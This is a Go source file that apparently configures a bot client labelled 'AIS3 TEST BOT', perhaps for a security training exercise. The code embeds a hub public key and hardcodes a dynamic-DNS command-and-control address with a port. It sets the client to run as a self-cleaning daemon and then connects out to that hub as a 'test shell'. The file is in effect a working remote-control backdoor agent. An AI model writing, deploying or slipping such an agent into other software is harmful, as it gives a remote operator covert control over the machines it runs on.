// go build bot.go
package main

import (
	"encoding/base64"
	"runtime"

	kit "./lib/toolkit"
	"./lib/base"
)


var hubPubKey, _ = base64.StdEncoding.DecodeString("MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEArogYEOHItjtm0wJOX+hSHjGTIPUsRo/TyLGYxWVk79pNWAhCSvH9nfvpx0skefcL/Nd++Qb/zb3c+o7ZI4zbMKZJLim3yaN8IDlgrjKG7wmjB5r49++LrvRzjIJCAoeFog2PfEn3qlQ+PA26TqLsbPNZi9nsaHlwTOqGljg82g23Zqj1o5JfitJvVlRLmhPqc8kO+4Dvf08MdVS6vBGZjzWFmGx9k3rrDoi7tem22MflFnOQhgLJ4/sbd4Y71ok98ChrQhb6SzZKVWN5v7VCuKqhFLmhZuK0z0f/xkBNcMeCplVLhs/gLIU3HBmvbBSYhmN4dDL19cAv1MkQ6lb1dwIDAQAB")
var hubAddr string = "cs8425.noip.me:8787"

var proc int = runtime.NumCPU() + 2

func main() {

	c := base.NewClientM()
	c.UUID = kit.HashBytes256([]byte("AIS3 TEST BOT"))
	c.AgentTag = "AIS3 TEST BOT"
	c.HubKeyTag = "HELLO"
	c.HubPubKey = hubPubKey
	c.Daemon = true
	c.AutoClean = true
	c.Info.Set("AIS3", "test shell XD")
//	c.Info.Set("AIS3-2", "test2")

	c.Proc = proc

	c.Start(hubAddr)

}


